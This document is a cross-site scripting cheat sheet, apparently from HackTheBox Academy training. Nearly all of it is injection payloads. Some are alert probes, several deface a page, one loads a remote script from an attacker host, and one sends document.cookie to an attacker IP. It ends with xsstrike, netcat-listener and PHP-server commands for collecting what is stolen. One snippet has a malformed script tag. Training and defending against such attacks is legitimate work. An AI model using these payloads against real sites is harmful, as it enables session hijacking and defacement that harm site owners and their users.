# XSS Cheat Sheet


```Javascript
<script>alert(window.origin)</script>
```
*Description:* Basic XSS Payload

```Javascript
<plaintext>
```
*Description:* Basic XSS Payload

```Javascript
<script>print()</script>
```
*Description:* Basic XSS Payload

```Javascript
<img src="" onerror=alert(window.origin)>
```
*Description:* HTML-based XSS Payload

```Javascript
<script>document.body.style.background = "#141d2b"</script>
`````
*Description:* Change Background Color

```Javascript
<script document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
*Description:* Change Background Image

```Javascript
<script>document.title = 'HackTheBox Academy'</script>
```
*Description:* Change Website Title

```Javascript
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```
*Description:* Overwrite website's main body

```Javascript
<script>document.getElementById('urlform').remove();</script>
`````
*Description:* Remove certain HTML element

```Javascript
<script src="http://OUR_IP/script.js"></script>
```
*Description:* Load remote script

```Javascript
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```
*Description:* Send Cookie details to us

## Commands

```python
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```
*Description:* Run `xsstrike` on a url parameter

```sh
sudo nc -lvnp 80
```
*Description:* Start `netcat` listener

```sh
sudo php -S 0.0.0.0:80
```
*Description:* Start `PHP` server
